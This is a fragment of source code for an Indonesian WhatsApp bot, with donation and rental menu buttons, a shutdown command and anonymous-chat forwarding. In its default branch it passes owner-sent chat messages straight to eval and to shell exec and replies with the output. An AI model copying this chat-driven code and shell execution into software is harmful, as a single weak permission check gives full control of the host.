//DONASI
case 'donasi':
var unicorn = await getBuffer('https://cdn.pixabay.com/photo/2014/06/04/16/41/thank-you-362164_960_720.jpg')
await bluz.send5ButLoc(from, `` + '' + lang.donasi(pushname, owner), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "GropBot 📍","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "Donasi 🔖","url": `https://saweria.co/ceria`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "🧾 Sewa","id": 'sewa'}},{"quickReplyButton": {"displayText": "👤 Administrasi","id": 'owner'}}] )
break
//SEWA
case 'sewa':
var unicorn = await getBuffer('https://images8.alphacoders.com/569/569800.jpg')
await bluz.send5ButLoc(from, `` + '' + lang.sewa(pushname), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "GropBot 📍","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "Contack Administrasi","url": `https://s.id/sewabot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "📖 Kelebihan Sewa Bot","id": 'kelebihan'}},{"quickReplyButton": {"displayText": "👤 Administrasi","id": 'owner'}}] )
break
//KELEBIHAN
case 'kelebihan':
var unicorn = await getBuffer('https://images.wallpaperscraft.com/image/single/girl_grass_city_213102_1600x900.jpg')
await bluz.send5ButLoc(from, `` + '' + lang.kelebihan(pushname), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "GropBot 📍","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "Contack Administrasi","url": `https://s.id/sewabot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "🧾 Sewa","id": 'sewa'}},{"quickReplyButton": {"displayText": "👤 Administrasi","id": 'owner'}}] )
break
//TQTQ
case 'tqtq':
var unicorn = await getBuffer('https://c4.wallpaperflare.com/wallpaper/264/666/478/3-316-16-9-aspect-ratio-s-sfw-wallpaper-preview.jpg')
await bluz.send5ButLoc(from, `` + '' + lang.tqtq(), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "GropBot 📍","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "Donasi 🔖","url": `https://saweria.co/ceria`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "🧾 Sewa","id": 'sewa'}}] )
break
case 'shutdown':
if (!isCreator) return m.reply(mess.owner)
m.reply(`Good Bye...`)
await sleep(3000)
process.exit()
break

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }

		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    bluz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
